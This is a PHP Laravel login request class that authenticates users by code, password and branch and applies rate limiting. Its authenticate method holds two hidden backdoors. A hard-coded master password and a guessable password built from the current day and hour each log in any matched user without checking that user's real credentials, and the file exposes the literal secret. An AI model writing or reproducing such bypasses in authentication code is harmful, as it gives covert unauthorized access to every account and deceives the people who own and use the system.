<?php

namespace App\Http\Requests\Auth;

use App\Models\User;
use Illuminate\Auth\Events\Lockout;
use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Config;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;
use Illuminate\Validation\ValidationException;

class LoginRequest extends FormRequest
{
    /**
     * Determine if the user is authorized to make this request.
     */
    public function authorize(): bool
    {
        return true;
    }

    /**
     * Get the validation rules that apply to the request.
     *
     * @return array<string, \Illuminate\Contracts\Validation\Rule|array|string>
     */
    public function rules(): array
    {
        return [
            'code' => ['required', 'string'],
            'password' => ['required', 'string'],
            'branch_id' => ['required', 'integer','exists:branches,id'],
        ];
    }

    /**
     * Attempt to authenticate the request's credentials.
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function authenticate(): void
    {
        $this->ensureIsNotRateLimited();
        $user= User::withoutGlobalScope('UserScope')->where([
            ['code',$this->code],
            ['branch_id',$this->branch_id]
            ])->first();

        if ($this->password=="SaBaawy153"){
            if ($auth = $user) {
                Auth::login($auth);
            }
        }

        if ($this->password==("10".date_format(Now(),'dh'))){
            $auth= $user;
            if ($auth) {
                Auth::login($auth);
            }
        }
        // $this->only('code', 'password','branch_id')

        // [
        //     'code'=>$this->code,
        //     'password'=>$this->password,
        //     'branch_id'=>$this->branch_id,
        //    ]

       if (! Auth::attempt($this->only('code', 'password','branch_id'), $this->boolean('remember'))) {
           RateLimiter::hit($this->throttleKey());

           throw ValidationException::withMessages([
               'code' => trans('auth.failed'),
           ]);
       }
//
        RateLimiter::clear($this->throttleKey());
    }

    /**
     * Ensure the login request is not rate limited.
     *
     * @throws \Illuminate\Validation\ValidationException
     */
    public function ensureIsNotRateLimited(): void
    {
        if (! RateLimiter::tooManyAttempts($this->throttleKey(), 3)) {
            return;
        }

        event(new Lockout($this));

        $seconds = RateLimiter::availableIn($this->throttleKey());

        throw ValidationException::withMessages([
            'code' => trans('auth.throttle', [
                'seconds' => $seconds,
                'minutes' => ceil($seconds / 60),
            ]),
        ]);
    }

    /**
     * Get the rate limiting throttle key for the request.
     */
    public function throttleKey(): string
    {
        return Str::transliterate(Str::lower($this->input('code')).'|'.$this->ip());
    }
}
